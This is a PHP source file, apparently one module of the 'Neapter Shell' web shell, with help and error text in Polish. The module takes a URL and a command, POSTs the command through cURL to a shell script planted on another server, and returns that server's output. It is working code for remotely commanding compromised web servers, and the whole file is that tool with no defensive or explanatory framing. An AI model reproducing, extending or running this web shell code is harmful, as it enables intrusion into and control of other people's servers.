<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Connect to remote shell and execute command
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleRemote extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('remote');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.0.1 2016-06-27 - <krzotr@gmail.com>';
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Zdalne wywołanie shella

	Użycie
		remote adres polecenie

	Przykład
		remote http://localhost/shell.php :info
DATA;
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() < 2) {
            return self::getHelp();
        }

        if (!extension_loaded('curl')) {
            return 'Brak rozszerzenie CURL';
        }

        $rCurl = curl_init();

        curl_setopt_array(
            $rCurl,
            array(
                CURLOPT_URL => $this->oArgs->getParam(0),
                CURLOPT_USERAGENT => 'Neapter Shell Agent',
                CURLOPT_ENCODING => 'gzip, deflate',
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => array('cmd' => $this->oArgs->getParam(1)),
                CURLOPT_CONNECTTIMEOUT => 60,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => array('X-Requested-With: XMLHttpRequest')
            )
        );

        $sData = curl_exec($rCurl);
        curl_close($rCurl);

        if ($sData === false) {
            return 'Nie można połączyć się ze zdalnym shellem';
        }

        return htmlspecialchars($sData);
    }

}
